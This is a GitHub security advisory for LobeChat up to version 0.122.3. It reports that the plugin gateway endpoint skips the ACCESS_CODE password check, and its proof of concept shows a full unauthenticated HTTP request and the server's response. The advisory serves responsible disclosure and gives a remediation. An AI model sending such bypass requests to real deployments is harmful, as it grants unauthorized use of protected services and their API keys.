# Unauthorized access to chat plugins

Moderate

[arvinxx](/arvinxx)
published
GHSA-pf55-fj96-xf37
Jan 31, 2024

## Package

No package listed

## Affected versions

<= 0.122.3

## Patched versions

0.122.4

## Description

### Description:

When the application is password-protected (deployed with the `ACCESS_CODE` option), it is possible to access plugins without proper authorization (without password).

### Proof-of-Concept:

Let’s suppose that application has been deployed with following command:

`sudo docker run -d -p 3210:3210 -e OPENAI_API_KEY=sk-[REDACTED] -e ACCESS_CODE=TEST123 --name lobe-chat lobehub/lobe-chat`

Due to the utilization of the `ACCESS_CODE`, access to the chat is possible only after entering the password:

[![image](https://raw.githubusercontent.com/dastaj/assets/main/others/image.png)](https://raw.githubusercontent.com/dastaj/assets/main/others/image.png)

However, it is possible to interact with chat plugins without entering the `ACCESS_CODE`.

Example HTTP request:

```
POST /api/plugin/gateway HTTP/1.1
Host: localhost:3210
Content-Length: 1276

{"apiName":"checkWeatherUsingGET","arguments":"{\n  \"location\": \"London\"\n}","identifier":"WeatherGPT","type":"default","manifest":{"api":[{"description":"Get current weather information","name":"checkWeatherUsingGET","parameters":{"properties":{"location":{"type":"string"}},"required":["location"],"type":"object"}}],"homepage":"https://weathergpt.vercel.app/legal","identifier":"WeatherGPT","meta":{"avatar":"https://openai-collections.chat-plugin.lobehub.com/weather-gpt/logo.webp","description":"Get current weather information for a specific location.","title":"WeatherGPT"},"openapi":"https://openai-collections.chat-plugin.lobehub.com/weather-gpt/openapi.json","systemRole":"Use the WeatherGPT plugin to automatically fetch current weather information for a specific location when it's being generated by the ChatGPT assistant. The plugin will return weather data, including temperature, wind speed, humidity, and other relevant information, as well as a link to a page that has all the information. Links will always be returned and should be shown to the user. The weather data can be used to provide users with up-to-date and accurate weather information for their desired location.","type":"default","version":"1","settings":{"properties":{},"type":"object"}}}

```

HTTP response:

```
HTTP/1.1 200 OK
[...]
{"location":{"name":"London","region":"City of London, Greater London","country":"United Kingdom","lat":51.52,"lon":-0.11,"tz_id":"Europe/London","localtime_epoch":1706379026,"localtime":"2024-01-27 18:10"},"current":{"last_updated_epoch":1706378400,"last_updated":"2024-01-27 18:00","temp_c":6,"temp_f":42.8,"is_day":0,"condition":{"text":"Clear","icon":"//cdn.weatherapi.com/weather/64x64/night/113.png","code":1000},"wind_mph":4.3,"wind_kph":6.8,"wind_degree":170,"wind_dir":"S","pressure_mb":1031,"pressure_in":30.45,"precip_mm":0,"precip_in":0,"humidity":81,"cloud":0,"feelslike_c":3.8,"feelslike_f":38.9,"vis_km":10,"vis_miles":6,"uv":1,"gust_mph":9.5,"gust_kph":15.3},"infoLink":"https://weathergpt.vercel.app/London"}

```
### Remediation:

Verify the `ACCESS_CODE` for HTTP requests to the `/api/plugin/:` route.

### Impact:

Unauthorized access to plugins.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
